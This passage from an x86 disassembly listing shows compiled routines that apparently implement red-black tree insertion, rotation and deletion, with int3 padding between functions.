   156ed:	mov    DWORD PTR [edx+0x68],eax
   156f0:	mov    DWORD PTR [ecx+0x68],eax
   156f3:	mov    eax,DWORD PTR [esi+0x4]
   156f6:	mov    eax,DWORD PTR [eax+0x4]
   156f9:	and    DWORD PTR [eax+0x68],0x0
   156fd:	mov    eax,DWORD PTR [esi+0x4]
   15700:	mov    esi,DWORD PTR [eax+0x4]
   15703:	jmp    0x15734
   15705:	cmp    esi,DWORD PTR [eax]
   15707:	jne    0x15713
   15709:	mov    esi,eax
   1570b:	push   esi
   1570c:	mov    ecx,edi
   1570e:	call   0x1137a
   15713:	mov    eax,DWORD PTR [esi+0x4]
   15716:	mov    DWORD PTR [eax+0x68],0x1
   1571d:	mov    eax,DWORD PTR [esi+0x4]
   15720:	mov    eax,DWORD PTR [eax+0x4]
   15723:	and    DWORD PTR [eax+0x68],0x0
   15727:	mov    eax,DWORD PTR [esi+0x4]
   1572a:	push   DWORD PTR [eax+0x4]
   1572d:	mov    ecx,edi
   1572f:	call   0x1130a
   15734:	mov    eax,DWORD PTR [edi+0x4]
   15737:	cmp    esi,DWORD PTR [eax+0x4]
   1573a:	jne    0x15692
   15740:	mov    eax,DWORD PTR [edi+0x4]
   15743:	mov    eax,DWORD PTR [eax+0x4]
   15746:	pop    edi
   15747:	mov    DWORD PTR [eax+0x68],0x1
   1574e:	mov    eax,DWORD PTR [ebp+0x8]
   15751:	pop    esi
   15752:	mov    DWORD PTR [eax],ebx
   15754:	pop    ebx
   15755:	pop    ebp
   15756:	ret    0x10
   15759:	int3   
   1575a:	int3   
   1575b:	int3   
   1575c:	int3   
   1575d:	int3   
   1575e:	mov    edi,edi
   15760:	push   ebp
   15761:	mov    ebp,esp
   15763:	push   ebx
   15764:	push   esi
   15765:	mov    esi,DWORD PTR [ebp+0x10]
   15768:	push   edi
   15769:	push   0x0
   1576b:	push   esi
   1576c:	mov    edi,ecx
   1576e:	call   0x139fe
   15773:	push   DWORD PTR [ebp+0x14]
   15776:	mov    ebx,eax
   15778:	mov    eax,ds:0x7f8c8
   1577d:	mov    DWORD PTR [ebx],eax
   1577f:	mov    eax,ds:0x7f8c8
   15784:	mov    DWORD PTR [ebx+0x8],eax
   15787:	lea    eax,[ebx+0xc]
   1578a:	push   eax
   1578b:	call   0x13b2a
   15790:	inc    DWORD PTR [edi+0xc]
   15793:	cmp    esi,DWORD PTR [edi+0x4]
   15796:	je     0x157c0
   15798:	mov    eax,DWORD PTR [ebp+0xc]
   1579b:	cmp    eax,DWORD PTR ds:0x7f8c8
   157a1:	jne    0x157c0
   157a3:	lea    eax,[esi+0xc]
   157a6:	push   eax
   157a7:	push   DWORD PTR [ebp+0x14]
   157aa:	call   0x197f4
   157af:	test   al,al
   157b1:	jne    0x157c0
   157b3:	mov    DWORD PTR [esi+0x8],ebx
   157b6:	mov    eax,DWORD PTR [edi+0x4]
   157b9:	cmp    esi,DWORD PTR [eax+0x8]
   157bc:	jne    0x157da
   157be:	jmp    0x157cf
   157c0:	mov    DWORD PTR [esi],ebx
   157c2:	mov    eax,DWORD PTR [edi+0x4]
   157c5:	cmp    esi,eax
   157c7:	jne    0x157d4
   157c9:	mov    DWORD PTR [eax+0x4],ebx
   157cc:	mov    eax,DWORD PTR [edi+0x4]
   157cf:	mov    DWORD PTR [eax+0x8],ebx
   157d2:	jmp    0x157da
   157d4:	cmp    esi,DWORD PTR [eax]
   157d6:	jne    0x157da
   157d8:	mov    DWORD PTR [eax],ebx
   157da:	mov    eax,DWORD PTR [edi+0x4]
   157dd:	mov    esi,ebx
   157df:	cmp    ebx,DWORD PTR [eax+0x4]
   157e2:	je     0x15896
   157e8:	mov    eax,DWORD PTR [esi+0x4]
   157eb:	xor    edx,edx
   157ed:	cmp    DWORD PTR [eax+0x1c],edx
   157f0:	jne    0x15896
   157f6:	mov    ecx,DWORD PTR [eax+0x4]
   157f9:	cmp    eax,DWORD PTR [ecx]
   157fb:	jne    0x15837
   157fd:	mov    ecx,DWORD PTR [ecx+0x8]
   15800:	cmp    DWORD PTR [ecx+0x1c],edx
   15803:	je     0x1583e
   15805:	cmp    esi,DWORD PTR [eax+0x8]
   15808:	jne    0x15814
   1580a:	mov    esi,eax
   1580c:	push   esi
   1580d:	mov    ecx,edi
   1580f:	call   0x13172
   15814:	mov    eax,DWORD PTR [esi+0x4]
   15817:	mov    DWORD PTR [eax+0x1c],0x1
   1581e:	mov    eax,DWORD PTR [esi+0x4]
   15821:	mov    eax,DWORD PTR [eax+0x4]
   15824:	and    DWORD PTR [eax+0x1c],0x0
   15828:	mov    eax,DWORD PTR [esi+0x4]
   1582b:	push   DWORD PTR [eax+0x4]
   1582e:	mov    ecx,edi
   15830:	call   0x131c0
   15835:	jmp    0x1588a
   15837:	mov    ecx,DWORD PTR [ecx]
   15839:	cmp    DWORD PTR [ecx+0x1c],edx
   1583c:	jne    0x1585b
   1583e:	mov    edx,eax
   15840:	xor    eax,eax
   15842:	inc    eax
   15843:	mov    DWORD PTR [edx+0x1c],eax
   15846:	mov    DWORD PTR [ecx+0x1c],eax
   15849:	mov    eax,DWORD PTR [esi+0x4]
   1584c:	mov    eax,DWORD PTR [eax+0x4]
   1584f:	and    DWORD PTR [eax+0x1c],0x0
   15853:	mov    eax,DWORD PTR [esi+0x4]
   15856:	mov    esi,DWORD PTR [eax+0x4]
   15859:	jmp    0x1588a
   1585b:	cmp    esi,DWORD PTR [eax]
   1585d:	jne    0x15869
   1585f:	mov    esi,eax
   15861:	push   esi
   15862:	mov    ecx,edi
   15864:	call   0x131c0
   15869:	mov    eax,DWORD PTR [esi+0x4]
   1586c:	mov    DWORD PTR [eax+0x1c],0x1
   15873:	mov    eax,DWORD PTR [esi+0x4]
   15876:	mov    eax,DWORD PTR [eax+0x4]
   15879:	and    DWORD PTR [eax+0x1c],0x0
   1587d:	mov    eax,DWORD PTR [esi+0x4]
   15880:	push   DWORD PTR [eax+0x4]
   15883:	mov    ecx,edi
   15885:	call   0x13172
   1588a:	mov    eax,DWORD PTR [edi+0x4]
   1588d:	cmp    esi,DWORD PTR [eax+0x4]
   15890:	jne    0x157e8
   15896:	mov    eax,DWORD PTR [edi+0x4]
   15899:	mov    eax,DWORD PTR [eax+0x4]
   1589c:	pop    edi
   1589d:	mov    DWORD PTR [eax+0x1c],0x1
   158a4:	mov    eax,DWORD PTR [ebp+0x8]
   158a7:	pop    esi
   158a8:	mov    DWORD PTR [eax],ebx
   158aa:	pop    ebx
   158ab:	pop    ebp
   158ac:	ret    0x10
   158af:	int3   
   158b0:	int3   
   158b1:	int3   
   158b2:	int3   
   158b3:	int3   
   158b4:	mov    edi,edi
   158b6:	push   ebp
   158b7:	mov    ebp,esp
   158b9:	push   ecx
   158ba:	push   ecx
   158bb:	push   ebx
   158bc:	push   esi
   158bd:	mov    DWORD PTR [ebp-0x4],ecx
   158c0:	push   edi
   158c1:	mov    edi,DWORD PTR [ebp+0xc]
   158c4:	lea    ecx,[ebp+0xc]
   158c7:	call   0x11588
   158cc:	mov    esi,DWORD PTR [edi]
   158ce:	mov    eax,ds:0x7f8cc
   158d3:	mov    ebx,edi
   158d5:	mov    DWORD PTR [ebp-0x8],esi
   158d8:	cmp    esi,eax
   158da:	jne    0x158f8
   158dc:	mov    esi,DWORD PTR [edi+0x8]
   158df:	mov    eax,DWORD PTR [ebx+0x4]
   158e2:	mov    ecx,DWORD PTR [ebp-0x4]
   158e5:	mov    DWORD PTR [esi+0x4],eax
   158e8:	mov    eax,DWORD PTR [ecx+0x4]
   158eb:	cmp    DWORD PTR [eax+0x4],edi
   158ee:	jne    0x1596d
   158f0:	mov    DWORD PTR [eax+0x4],esi
   158f3:	jmp    0x1597b
   158f8:	mov    ecx,DWORD PTR [edi+0x8]
   158fb:	cmp    ecx,eax
   158fd:	je     0x158df
   158ff:	push   ecx
   15900:	call   0x114b0
   15905:	mov    ebx,eax
   15907:	mov    esi,DWORD PTR [ebx+0x8]
   1590a:	cmp    ebx,edi
   1590c:	je     0x158df
   1590e:	mov    eax,DWORD PTR [ebp-0x8]
   15911:	mov    DWORD PTR [eax+0x4],ebx
   15914:	mov    eax,DWORD PTR [edi]
   15916:	mov    DWORD PTR [ebx],eax
   15918:	cmp    ebx,DWORD PTR [edi+0x8]
   1591b:	jne    0x15922
   1591d:	mov    DWORD PTR [esi+0x4],ebx
   15920:	jmp    0x15939
   15922:	mov    eax,DWORD PTR [ebx+0x4]
   15925:	mov    DWORD PTR [esi+0x4],eax
   15928:	mov    eax,DWORD PTR [ebx+0x4]
   1592b:	mov    DWORD PTR [eax],esi
   1592d:	mov    eax,DWORD PTR [edi+0x8]
   15930:	mov    DWORD PTR [ebx+0x8],eax
   15933:	mov    eax,DWORD PTR [edi+0x8]
   15936:	mov    DWORD PTR [eax+0x4],ebx
   15939:	mov    eax,DWORD PTR [ebp-0x4]
   1593c:	mov    eax,DWORD PTR [eax+0x4]
   1593f:	cmp    DWORD PTR [eax+0x4],edi
   15942:	jne    0x15949
   15944:	mov    DWORD PTR [eax+0x4],ebx
   15947:	jmp    0x15957
   15949:	mov    eax,DWORD PTR [edi+0x4]
   1594c:	cmp    DWORD PTR [eax],edi
   1594e:	jne    0x15954
   15950:	mov    DWORD PTR [eax],ebx
   15952:	jmp    0x15957
   15954:	mov    DWORD PTR [eax+0x8],ebx
   15957:	mov    eax,DWORD PTR [edi+0x4]
   1595a:	mov    DWORD PTR [ebx+0x4],eax
   1595d:	mov    eax,DWORD PTR [ebx+0x14]
   15960:	mov    ecx,DWORD PTR [edi+0x14]
   15963:	mov    DWORD PTR [ebx+0x14],ecx
   15966:	mov    DWORD PTR [edi+0x14],eax
   15969:	mov    ebx,edi
   1596b:	jmp    0x159ce
   1596d:	mov    eax,DWORD PTR [edi+0x4]
   15970:	cmp    DWORD PTR [eax],edi
   15972:	jne    0x15978
   15974:	mov    DWORD PTR [eax],esi
   15976:	jmp    0x1597b
   15978:	mov    DWORD PTR [eax+0x8],esi
   1597b:	mov    eax,DWORD PTR [ecx+0x4]
   1597e:	mov    DWORD PTR [ebp-0x8],eax
   15981:	cmp    DWORD PTR [eax],edi
   15983:	jne    0x159a5
   15985:	mov    edx,DWORD PTR [edi+0x8]
   15988:	cmp    edx,DWORD PTR ds:0x7f8cc
   1598e:	jne    0x15997
   15990:	mov    edx,DWORD PTR [edi+0x4]
   15993:	mov    DWORD PTR [eax],edx
   15995:	jmp    0x159a5
   15997:	push   esi
   15998:	call   0x114b0
   1599d:	mov    ecx,DWORD PTR [ebp-0x8]
   159a0:	mov    DWORD PTR [ecx],eax
   159a2:	mov    ecx,DWORD PTR [ebp-0x4]
   159a5:	mov    eax,DWORD PTR [ecx+0x4]
   159a8:	mov    DWORD PTR [ebp-0x8],eax
   159ab:	cmp    DWORD PTR [eax+0x8],edi
   159ae:	jne    0x159ce
   159b0:	mov    ecx,DWORD PTR [edi]
   159b2:	cmp    ecx,DWORD PTR ds:0x7f8cc
   159b8:	jne    0x159c2
   159ba:	mov    ecx,DWORD PTR [edi+0x4]
   159bd:	mov    DWORD PTR [eax+0x8],ecx
   159c0:	jmp    0x159ce
   159c2:	push   esi
   159c3:	call   0x1148e
   159c8:	mov    ecx,DWORD PTR [ebp-0x8]
   159cb:	mov    DWORD PTR [ecx+0x8],eax
   159ce:	xor    edi,edi
   159d0:	inc    edi
   159d1:	cmp    DWORD PTR [ebx+0x14],edi
   159d4:	jne    0x15aeb
   159da:	jmp    0x15a99
   159df:	cmp    DWORD PTR [esi+0x14],edi
   159e2:	jne    0x15ae8
   159e8:	mov    eax,DWORD PTR [esi+0x4]
   159eb:	cmp    esi,DWORD PTR [eax]
   159ed:	jne    0x15a64
   159ef:	mov    eax,DWORD PTR [eax+0x8]
   159f2:	cmp    DWORD PTR [eax+0x14],0x0
   159f6:	jne    0x15a10
   159f8:	mov    DWORD PTR [eax+0x14],edi
   159fb:	mov    eax,DWORD PTR [esi+0x4]
   159fe:	and    DWORD PTR [eax+0x14],0x0
   15a02:	push   DWORD PTR [esi+0x4]
   15a05:	call   0x13250
   15a0a:	mov    eax,DWORD PTR [esi+0x4]
   15a0d:	mov    eax,DWORD PTR [eax+0x8]
   15a10:	mov    ecx,DWORD PTR [eax]
   15a12:	cmp    DWORD PTR [ecx+0x14],edi
   15a15:	jne    0x15a1f
   15a17:	mov    ecx,DWORD PTR [eax+0x8]
   15a1a:	cmp    DWORD PTR [ecx+0x14],edi
   15a1d:	je     0x15a92
   15a1f:	mov    ecx,DWORD PTR [eax+0x8]
   15a22:	cmp    DWORD PTR [ecx+0x14],edi
   15a25:	jne    0x15a3f
   15a27:	mov    ecx,DWORD PTR [eax]
   15a29:	mov    DWORD PTR [ecx+0x14],edi
   15a2c:	mov    ecx,DWORD PTR [ebp-0x4]
   15a2f:	and    DWORD PTR [eax+0x14],0x0
   15a33:	push   eax
   15a34:	call   0x1329e
   15a39:	mov    eax,DWORD PTR [esi+0x4]
   15a3c:	mov    eax,DWORD PTR [eax+0x8]
   15a3f:	mov    ecx,DWORD PTR [esi+0x4]
   15a42:	mov    ecx,DWORD PTR [ecx+0x14]
   15a45:	mov    DWORD PTR [eax+0x14],ecx
   15a48:	mov    ecx,DWORD PTR [esi+0x4]
   15a4b:	mov    DWORD PTR [ecx+0x14],edi
   15a4e:	mov    eax,DWORD PTR [eax+0x8]
   15a51:	mov    ecx,DWORD PTR [ebp-0x4]
   15a54:	mov    DWORD PTR [eax+0x14],edi
   15a57:	push   DWORD PTR [esi+0x4]
   15a5a:	call   0x13250
   15a5f:	jmp    0x15ae8
   15a64:	mov    eax,DWORD PTR [eax]
   15a66:	cmp    DWORD PTR [eax+0x14],0x0
   15a6a:	jne    0x15a83
   15a6c:	mov    DWORD PTR [eax+0x14],edi
   15a6f:	mov    eax,DWORD PTR [esi+0x4]
   15a72:	and    DWORD PTR [eax+0x14],0x0
   15a76:	push   DWORD PTR [esi+0x4]
   15a79:	call   0x1329e
   15a7e:	mov    eax,DWORD PTR [esi+0x4]
   15a81:	mov    eax,DWORD PTR [eax]
   15a83:	mov    ecx,DWORD PTR [eax+0x8]
   15a86:	cmp    DWORD PTR [ecx+0x14],edi
   15a89:	jne    0x15aaa
   15a8b:	mov    ecx,DWORD PTR [eax]
   15a8d:	cmp    DWORD PTR [ecx+0x14],edi
   15a90:	jne    0x15aaa
   15a92:	and    DWORD PTR [eax+0x14],0x0
   15a96:	mov    esi,DWORD PTR [esi+0x4]
   15a99:	mov    ecx,DWORD PTR [ebp-0x4]
   15a9c:	mov    eax,DWORD PTR [ecx+0x4]
   15a9f:	cmp    esi,DWORD PTR [eax+0x4]
   15aa2:	jne    0x159df
   15aa8:	jmp    0x15ae8
   15aaa:	mov    ecx,DWORD PTR [eax]
   15aac:	cmp    DWORD PTR [ecx+0x14],edi
   15aaf:	jne    0x15ac9
   15ab1:	mov    ecx,DWORD PTR [eax+0x8]
   15ab4:	mov    DWORD PTR [ecx+0x14],edi
   15ab7:	mov    ecx,DWORD PTR [ebp-0x4]
   15aba:	and    DWORD PTR [eax+0x14],0x0
   15abe:	push   eax
   15abf:	call   0x13250
   15ac4:	mov    eax,DWORD PTR [esi+0x4]
   15ac7:	mov    eax,DWORD PTR [eax]
   15ac9:	mov    ecx,DWORD PTR [esi+0x4]
   15acc:	mov    ecx,DWORD PTR [ecx+0x14]
   15acf:	mov    DWORD PTR [eax+0x14],ecx
   15ad2:	mov    ecx,DWORD PTR [esi+0x4]
   15ad5:	mov    DWORD PTR [ecx+0x14],edi
   15ad8:	mov    eax,DWORD PTR [eax]
   15ada:	mov    ecx,DWORD PTR [ebp-0x4]
   15add:	mov    DWORD PTR [eax+0x14],edi
   15ae0:	push   DWORD PTR [esi+0x4]
   15ae3:	call   0x1329e
   15ae8:	mov    DWORD PTR [esi+0x14],edi
   15aeb:	lea    eax,[ebx+0xc]
   15aee:	push   eax
   15aef:	call   0x13b66
   15af4:	push   ebx
   15af5:	call   0x10a86
   15afa:	mov    eax,DWORD PTR [ebp-0x4]
   15afd:	dec    DWORD PTR [eax+0xc]
   15b00:	mov    eax,DWORD PTR [ebp+0x8]
   15b03:	pop    ecx
   15b04:	mov    ecx,DWORD PTR [ebp+0xc]
   15b07:	pop    edi
   15b08:	pop    esi
   15b09:	mov    DWORD PTR [eax],ecx
   15b0b:	pop    ebx
   15b0c:	leave  
   15b0d:	ret    0x8
   15b10:	int3   
   15b11:	int3   
   15b12:	int3   
   15b13:	int3   
   15b14:	int3   
   15b15:	int3   
   15b16:	mov    edi,edi
   15b18:	push   ebp
   15b19:	mov    ebp,esp
   15b1b:	push   ebx
   15b1c:	push   esi
   15b1d:	push   edi
   15b1e:	mov    edi,DWORD PTR [ebp+0x8]
   15b21:	mov    ebx,ecx
   15b23:	mov    esi,edi
   15b25:	cmp    edi,DWORD PTR ds:0x7f8cc
   15b2b:	je     0x15b53
   15b2d:	push   DWORD PTR [esi+0x8]
   15b30:	mov    ecx,ebx
   15b32:	call   0x15b16
   15b37:	mov    esi,DWORD PTR [esi]
   15b39:	lea    eax,[edi+0xc]
   15b3c:	push   eax
   15b3d:	call   0x13b66
   15b42:	push   edi
   15b43:	call   0x10a86
   15b48:	pop    ecx
   15b49:	mov    edi,esi
   15b4b:	cmp    esi,DWORD PTR ds:0x7f8cc
   15b51:	jne    0x15b2d
   15b53:	pop    edi
   15b54:	pop    esi
   15b55:	pop    ebx
   15b56:	pop    ebp
   15b57:	ret    0x4
   15b5a:	int3   
   15b5b:	int3   
   15b5c:	int3   
   15b5d:	int3   
   15b5e:	int3   
   15b5f:	int3   
   15b60:	mov    edi,edi
   15b62:	push   ebp
   15b63:	mov    ebp,esp
   15b65:	push   ebx
   15b66:	push   esi
   15b67:	mov    esi,DWORD PTR [ebp+0x10]
   15b6a:	push   edi
   15b6b:	push   0x0
   15b6d:	push   esi
   15b6e:	mov    edi,ecx
   15b70:	call   0x1396e
   15b75:	push   DWORD PTR [ebp+0x14]
   15b78:	mov    ebx,eax
   15b7a:	mov    eax,ds:0x7f8cc
   15b7f:	mov    DWORD PTR [ebx],eax
   15b81:	mov    eax,ds:0x7f8cc
   15b86:	mov    DWORD PTR [ebx+0x8],eax
   15b89:	lea    eax,[ebx+0xc]
   15b8c:	push   eax
   15b8d:	call   0x13b48
   15b92:	inc    DWORD PTR [edi+0xc]
   15b95:	cmp    esi,DWORD PTR [edi+0x4]
   15b98:	je     0x15bbc
   15b9a:	mov    eax,DWORD PTR [ebp+0xc]
   15b9d:	cmp    eax,DWORD PTR ds:0x7f8cc
   15ba3:	jne    0x15bbc
   15ba5:	mov    eax,DWORD PTR [ebp+0x14]
   15ba8:	mov    eax,DWORD PTR [eax]
   15baa:	cmp    eax,DWORD PTR [esi+0xc]
   15bad:	jl     0x15bbc
   15baf:	mov    DWORD PTR [esi+0x8],ebx
   15bb2:	mov    eax,DWORD PTR [edi+0x4]
   15bb5:	cmp    esi,DWORD PTR [eax+0x8]
   15bb8:	jne    0x15bd6
   15bba:	jmp    0x15bcb
   15bbc:	mov    DWORD PTR [esi],ebx
   15bbe:	mov    eax,DWORD PTR [edi+0x4]
   15bc1:	cmp    esi,eax
   15bc3:	jne    0x15bd0
   15bc5:	mov    DWORD PTR [eax+0x4],ebx
   15bc8:	mov    eax,DWORD PTR [edi+0x4]
   15bcb:	mov    DWORD PTR [eax+0x8],ebx
   15bce:	jmp    0x15bd6
   15bd0:	cmp    esi,DWORD PTR [eax]
   15bd2:	jne    0x15bd6
   15bd4:	mov    DWORD PTR [eax],ebx
   15bd6:	mov    eax,DWORD PTR [edi+0x4]
   15bd9:	mov    esi,ebx
   15bdb:	cmp    ebx,DWORD PTR [eax+0x4]
   15bde:	je     0x15c92
   15be4:	mov    eax,DWORD PTR [esi+0x4]
   15be7:	xor    edx,edx
   15be9:	cmp    DWORD PTR [eax+0x14],edx
   15bec:	jne    0x15c92
   15bf2:	mov    ecx,DWORD PTR [eax+0x4]
   15bf5:	cmp    eax,DWORD PTR [ecx]
   15bf7:	jne    0x15c33
   15bf9:	mov    ecx,DWORD PTR [ecx+0x8]
   15bfc:	cmp    DWORD PTR [ecx+0x14],edx
   15bff:	je     0x15c3a
   15c01:	cmp    esi,DWORD PTR [eax+0x8]
   15c04:	jne    0x15c10
   15c06:	mov    esi,eax
   15c08:	push   esi
   15c09:	mov    ecx,edi
   15c0b:	call   0x13250
   15c10:	mov    eax,DWORD PTR [esi+0x4]
   15c13:	mov    DWORD PTR [eax+0x14],0x1
   15c1a:	mov    eax,DWORD PTR [esi+0x4]
   15c1d:	mov    eax,DWORD PTR [eax+0x4]
   15c20:	and    DWORD PTR [eax+0x14],0x0
   15c24:	mov    eax,DWORD PTR [esi+0x4]
   15c27:	push   DWORD PTR [eax+0x4]
   15c2a:	mov    ecx,edi
   15c2c:	call   0x1329e
   15c31:	jmp    0x15c86
   15c33:	mov    ecx,DWORD PTR [ecx]
   15c35:	cmp    DWORD PTR [ecx+0x14],edx
   15c38:	jne    0x15c57
   15c3a:	mov    edx,eax
   15c3c:	xor    eax,eax
   15c3e:	inc    eax
   15c3f:	mov    DWORD PTR [edx+0x14],eax
   15c42:	mov    DWORD PTR [ecx+0x14],eax
   15c45:	mov    eax,DWORD PTR [esi+0x4]
   15c48:	mov    eax,DWORD PTR [eax+0x4]
   15c4b:	and    DWORD PTR [eax+0x14],0x0
   15c4f:	mov    eax,DWORD PTR [esi+0x4]
   15c52:	mov    esi,DWORD PTR [eax+0x4]
   15c55:	jmp    0x15c86
   15c57:	cmp    esi,DWORD PTR [eax]
   15c59:	jne    0x15c65
   15c5b:	mov    esi,eax
   15c5d:	push   esi
   15c5e:	mov    ecx,edi
   15c60:	call   0x1329e
   15c65:	mov    eax,DWORD PTR [esi+0x4]
   15c68:	mov    DWORD PTR [eax+0x14],0x1
   15c6f:	mov    eax,DWORD PTR [esi+0x4]
   15c72:	mov    eax,DWORD PTR [eax+0x4]
   15c75:	and    DWORD PTR [eax+0x14],0x0
   15c79:	mov    eax,DWORD PTR [esi+0x4]
   15c7c:	push   DWORD PTR [eax+0x4]
   15c7f:	mov    ecx,edi
   15c81:	call   0x13250
   15c86:	mov    eax,DWORD PTR [edi+0x4]
   15c89:	cmp    esi,DWORD PTR [eax+0x4]
   15c8c:	jne    0x15be4
   15c92:	mov    eax,DWORD PTR [edi+0x4]
   15c95:	mov    eax,DWORD PTR [eax+0x4]
   15c98:	pop    edi
   15c99:	mov    DWORD PTR [eax+0x14],0x1
   15ca0:	mov    eax,DWORD PTR [ebp+0x8]
   15ca3:	pop    esi
   15ca4:	mov    DWORD PTR [eax],ebx
   15ca6:	pop    ebx
   15ca7:	pop    ebp
   15ca8:	ret    0x10
   15cab:	int3   
   15cac:	int3   
   15cad:	int3   
   15cae:	int3   
   15caf:	int3   
   15cb0:	mov    edi,edi
   15cb2:	push   ebp
   15cb3:	mov    ebp,esp
   15cb5:	push   ebx
   15cb6:	push   esi
   15cb7:	mov    esi,DWORD PTR [ebp+0x10]
   15cba:	push   edi
   15cbb:	push   0x0
   15cbd:	push   esi
   15cbe:	mov    edi,ecx
   15cc0:	call   0x139fe
   15cc5:	push   DWORD PTR [ebp+0x14]
   15cc8:	mov    ebx,eax
   15cca:	mov    eax,ds:0x7f8d4
   15ccf:	mov    DWORD PTR [ebx],eax
   15cd1:	mov    eax,ds:0x7f8d4
   15cd6:	mov    DWORD PTR [ebx+0x8],eax
   15cd9:	lea    eax,[ebx+0xc]
   15cdc:	push   eax
   15cdd:	call   0x13b7e
   15ce2:	inc    DWORD PTR [edi+0xc]
   15ce5:	cmp    esi,DWORD PTR [edi+0x4]
   15ce8:	je     0x15d12
   15cea:	mov    eax,DWORD PTR [ebp+0xc]
   15ced:	cmp    eax,DWORD PTR ds:0x7f8d4
   15cf3:	jne    0x15d12
   15cf5:	lea    eax,[esi+0xc]
   15cf8:	push   eax
   15cf9:	push   DWORD PTR [ebp+0x14]
   15cfc:	call   0x19824
   15d01:	test   al,al
   15d03:	jne    0x15d12
   15d05:	mov    DWORD PTR [esi+0x8],ebx
   15d08:	mov    eax,DWORD PTR [edi+0x4]
   15d0b:	cmp    esi,DWORD PTR [eax+0x8]
   15d0e:	jne    0x15d2c
   15d10:	jmp    0x15d21
   15d12:	mov    DWORD PTR [esi],ebx
   15d14:	mov    eax,DWORD PTR [edi+0x4]
   15d17:	cmp    esi,eax
   15d19:	jne    0x15d26
   15d1b:	mov    DWORD PTR [eax+0x4],ebx
   15d1e:	mov    eax,DWORD PTR [edi+0x4]
   15d21:	mov    DWORD PTR [eax+0x8],ebx
   15d24:	jmp    0x15d2c
   15d26:	cmp    esi,DWORD PTR [eax]
   15d28:	jne    0x15d2c
   15d2a:	mov    DWORD PTR [eax],ebx
   15d2c:	mov    eax,DWORD PTR [edi+0x4]
   15d2f:	mov    esi,ebx
   15d31:	cmp    ebx,DWORD PTR [eax+0x4]
   15d34:	je     0x15de8
   15d3a:	mov    eax,DWORD PTR [esi+0x4]
   15d3d:	xor    edx,edx
   15d3f:	cmp    DWORD PTR [eax+0x1c],edx
   15d42:	jne    0x15de8
   15d48:	mov    ecx,DWORD PTR [eax+0x4]
   15d4b:	cmp    eax,DWORD PTR [ecx]
   15d4d:	jne    0x15d89
   15d4f:	mov    ecx,DWORD PTR [ecx+0x8]
   15d52:	cmp    DWORD PTR [ecx+0x1c],edx
   15d55:	je     0x15d90
   15d57:	cmp    esi,DWORD PTR [eax+0x8]
   15d5a:	jne    0x15d66
   15d5c:	mov    esi,eax
   15d5e:	push   esi
   15d5f:	mov    ecx,edi
   15d61:	call   0x13366
   15d66:	mov    eax,DWORD PTR [esi+0x4]
   15d69:	mov    DWORD PTR [eax+0x1c],0x1
   15d70:	mov    eax,DWORD PTR [esi+0x4]
   15d73:	mov    eax,DWORD PTR [eax+0x4]
   15d76:	and    DWORD PTR [eax+0x1c],0x0
   15d7a:	mov    eax,DWORD PTR [esi+0x4]
   15d7d:	push   DWORD PTR [eax+0x4]
   15d80:	mov    ecx,edi
   15d82:	call   0x133b4
   15d87:	jmp    0x15ddc
   15d89:	mov    ecx,DWORD PTR [ecx]
   15d8b:	cmp    DWORD PTR [ecx+0x1c],edx
   15d8e:	jne    0x15dad
   15d90:	mov    edx,eax
   15d92:	xor    eax,eax
   15d94:	inc    eax
   15d95:	mov    DWORD PTR [edx+0x1c],eax
   15d98:	mov    DWORD PTR [ecx+0x1c],eax
   15d9b:	mov    eax,DWORD PTR [esi+0x4]
   15d9e:	mov    eax,DWORD PTR [eax+0x4]
   15da1:	and    DWORD PTR [eax+0x1c],0x0
   15da5:	mov    eax,DWORD PTR [esi+0x4]
   15da8:	mov    esi,DWORD PTR [eax+0x4]
   15dab:	jmp    0x15ddc
   15dad:	cmp    esi,DWORD PTR [eax]
   15daf:	jne    0x15dbb
   15db1:	mov    esi,eax
   15db3:	push   esi
   15db4:	mov    ecx,edi
   15db6:	call   0x133b4
   15dbb:	mov    eax,DWORD PTR [esi+0x4]
   15dbe:	mov    DWORD PTR [eax+0x1c],0x1
   15dc5:	mov    eax,DWORD PTR [esi+0x4]
   15dc8:	mov    eax,DWORD PTR [eax+0x4]
   15dcb:	and    DWORD PTR [eax+0x1c],0x0
   15dcf:	mov    eax,DWORD PTR [esi+0x4]
   15dd2:	push   DWORD PTR [eax+0x4]
   15dd5:	mov    ecx,edi
   15dd7:	call   0x13366
   15ddc:	mov    eax,DWORD PTR [edi+0x4]
   15ddf:	cmp    esi,DWORD PTR [eax+0x4]
   15de2:	jne    0x15d3a
   15de8:	mov    eax,DWORD PTR [edi+0x4]
   15deb:	mov    eax,DWORD PTR [eax+0x4]
   15dee:	pop    edi
   15def:	mov    DWORD PTR [eax+0x1c],0x1
   15df6:	mov    eax,DWORD PTR [ebp+0x8]
   15df9:	pop    esi
   15dfa:	mov    DWORD PTR [eax],ebx
   15dfc:	pop    ebx
   15dfd:	pop    ebp
   15dfe:	ret    0x10
   15e01:	int3   
   15e02:	int3   
   15e03:	int3   
   15e04:	int3   
   15e05:	int3   
   15e06:	mov    edi,edi
   15e08:	push   ebp
   15e09:	mov    ebp,esp
   15e0b:	push   ecx
   15e0c:	push   DWORD PTR [ebp-0x4]
   15e0f:	push   DWORD PTR [ebp+0x10]
   15e12:	push   DWORD PTR [ebp+0xc]
   15e15:	push   DWORD PTR [ebp+0x8]
   15e18:	call   0x14bd6
   15e1d:	add    esp,0x10
   15e20:	leave  
   15e21:	ret    
   15e22:	int3   
   15e23:	int3   
   15e24:	int3   
   15e25:	int3   
   15e26:	int3   
   15e27:	int3   
   15e28:	mov    edi,edi
   15e2a:	push   ebp
   15e2b:	mov    ebp,esp
   15e2d:	push   esi
   15e2e:	push   edi
   15e2f:	mov    edi,DWORD PTR [ebp+0x8]
   15e32:	mov    al,BYTE PTR [edi+0x8]
   15e35:	mov    esi,ecx
   15e37:	mov    BYTE PTR [esi+0x8],al
   15e3a:	call   0x14502
   15e3f:	push   edi
   15e40:	mov    ecx,esi
   15e42:	call   0x14b74
   15e47:	pop    edi
   15e48:	mov    eax,esi
   15e4a:	pop    esi
   15e4b:	pop    ebp
   15e4c:	ret    0x4
   15e4f:	int3   
   15e50:	int3   
   15e51:	int3   
   15e52:	int3   
   15e53:	int3   
   15e54:	mov    edi,edi
   15e56:	push   ebp
   15e57:	mov    ebp,esp
   15e59:	push   ecx
   15e5a:	push   esi
   15e5b:	mov    esi,ecx
   15e5d:	cmp    esi,DWORD PTR [ebp+0x8]
   15e60:	je     0x15e7e
   15e62:	mov    eax,DWORD PTR [esi+0x4]
   15e65:	mov    ecx,DWORD PTR [eax]
   15e67:	push   eax
   15e68:	push   ecx
   15e69:	lea    eax,[ebp-0x4]
   15e6c:	push   eax
